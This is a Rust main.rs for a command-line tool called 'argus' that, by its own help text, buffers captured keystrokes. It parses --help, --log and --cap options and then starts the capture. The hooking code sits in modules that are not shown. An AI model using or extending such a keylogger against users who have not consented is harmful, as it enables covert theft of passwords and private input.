mod argus;
mod cli_parser;
mod method;
use argus::Argus;

use std::process::exit;

static mut LOG: bool = false;
static mut BUFFER_CAPACITY: usize = 100;

fn wrapper() -> Result<(), String> {
    let args = cli_parser::get_args();
    {
        if args.contains(&"--help".to_string()) {
            return Err(r#"Usage: argus <METHOD> [OPTIONS]

ARGUMENTS
---------
    <METHOD>   The method to use for caching keystrokes.


OPTIONS
-------
    --cap      The buffer capacity needed to be met to handle the keystroke buffer
    --log      Outputs the current state of the buffer regarding its length before hitting the buffer cap
    --help     Display this message

Refer to: https://github.com/Eth3rna1/argus"#
                .to_string());
        }
        for (i, arg) in args.iter().enumerate() {
            if arg == "--log" {
                unsafe { LOG = true };
            }
            if arg == "--cap" {
                if i + 1 >= args.len() {
                    return Err("Please provide a number value for `--cap`.".to_string());
                }
                let value = &args[i + 1];
                match value.parse::<usize>() {
                    Ok(n) => unsafe { BUFFER_CAPACITY = n },
                    Err(msg) => return Err(msg.to_string()),
                }
            }
        }
    }
    let method = cli_parser::get_method()?;
    let mut argus = Argus::new(method).set_buffer_capacity(unsafe { BUFFER_CAPACITY });
    argus.start(unsafe { LOG });
    Ok(())
}

fn main() {
    match wrapper() {
        Ok(_) => (),
        Err(msg) => {
            eprintln!("{}", msg);
            exit(1);
        }
    }
}
